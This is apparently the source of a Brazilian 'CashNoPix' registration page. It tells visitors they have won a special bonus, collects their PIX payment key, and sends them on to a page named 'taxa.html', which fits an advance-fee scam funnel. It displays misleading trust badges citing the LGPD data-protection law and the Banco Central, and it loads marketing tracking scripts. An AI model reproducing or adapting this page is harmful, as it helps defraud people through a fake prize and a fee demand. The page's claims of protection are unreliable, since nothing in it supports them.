<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#0f172a">
  <title>CashNoPix - Cadastro</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="stylesheet" href="style.css">
  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-xcod-sck
    data-utmify-prevent-subids
    async
    defer
  ></script>
  <script src="pixel.js"></script>
</head>
<body>

<div class="cadastro-bg">
  <div class="cadastro-card">
    <button class="cad-close" onclick="history.back()" aria-label="Voltar">✕</button>

    <h2 class="cad-title">Parabéns!</h2>
    <p class="cad-desc">Você foi selecionado para receber o bônus especial. Cadastre sua chave PIX para que possamos validar e depositar seu saldo acumulado.</p>

    <div class="cad-field">
      <label>Sua melhor Chave PIX:</label>
      <input type="text" id="pixKey" placeholder="CPF, E-mail ou Celular" oninput="SFX.tick()">
    </div>

    <div class="cad-field">
      <label>Tipo de Chave:</label>
      <select id="pixType" onchange="SFX.tick()">
        <option value="cpf">CPF</option>
        <option value="email">E-mail</option>
        <option value="cel">Celular / Telefone</option>
        <option value="ale">Chave Aleatória</option>
      </select>
    </div>

    <button class="cad-btn" onclick="next()">CADASTRAR E RECEBER</button>

    <div class="cad-meta">
      🔒 Dados protegidos pela LGPD &nbsp;·&nbsp; 🏦 Banco Central
    </div>

  </div>
</div>

<script src="sounds.js"></script>
<script>
  function next() {
    const key = document.getElementById('pixKey').value;
    if (key.length < 5) {
      alert('Por favor, insira uma chave PIX válida.');
      return;
    }
    if (typeof SFX !== 'undefined') SFX.success();
    setTimeout(() => {
      window.location.href = 'taxa.html';
    }, 600);
  }
</script>

</body>
</html>
